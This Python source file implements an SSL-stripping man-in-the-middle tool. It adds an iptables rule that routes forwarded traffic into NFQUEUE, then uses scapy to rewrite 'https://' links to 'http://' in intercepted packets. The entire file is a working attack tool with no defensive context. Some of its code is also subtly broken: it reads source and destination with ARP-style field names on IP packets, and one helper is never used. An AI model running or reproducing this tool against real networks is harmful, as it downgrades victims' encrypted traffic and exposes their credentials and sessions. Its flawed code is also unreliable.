import netfilterqueue
import scapy.all as scapy
import logging
import os
import re


class SSLStripper:
    DEFAULT_QUEUE_NUM = 0

    def __init__(self, queue_num: int = DEFAULT_QUEUE_NUM):
        self.queue_num = queue_num

    def enable_netfilterqueue(self) -> None:
        os.system(
            f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        logging.info("Redirecting traffic via queue enabled")

    def disable_netfilterqueue(self) -> None:
        os.system(
            f"iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}")
        logging.info("Redirecting traffic via queue disabled")

    @staticmethod
    def set_load(packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.IP):

            logging.info(
                f"Packet {scapy_packet[scapy.IP].psrc} -> {scapy_packet[scapy.IP].pdst} intercepted")

            packet_processed = False

            if scapy_packet.haslayer(scapy.Raw):
                load = scapy_packet[scapy.Raw].load.decode(errors='ignore')

                if "https://" in load:
                    logging.info(
                        f"Stripping HTTPS in packet {scapy_packet[scapy.IP].psrc} -> {scapy_packet[scapy.IP].pdst} started")

                    new_load = load.replace("https://", "http://")
                    new_load = re.sub(r"Content-Length: \d+", "", new_load)

                    scapy_packet[scapy.Raw].load = new_load
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum

                    packet.set_payload(bytes(scapy_packet))
                    packet_processed = True

                    logging.info(
                        f"Stripping HTTPS in packet {scapy_packet[scapy.IP].psrc} -> {scapy_packet[scapy.IP].pdst} finished")
                    logging.info(
                        f"Packet {scapy_packet[scapy.IP].psrc} -> {scapy_packet[scapy.IP].pdst} forwarded")

            if not packet_processed:
                logging.info(
                    f"Packet {scapy_packet[scapy.IP].psrc} -> {scapy_packet[scapy.IP].pdst} ignored (NO HTTPS)")

        packet.accept()

    def run(self):
        logging.info("SSL stripping started")
        queue = netfilterqueue.NetfilterQueue()

        try:
            self.enable_netfilterqueue()
            queue.bind(self.queue_num, self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            logging.info("SSL stripping interrupted")

        logging.info("SSL stripping finished")
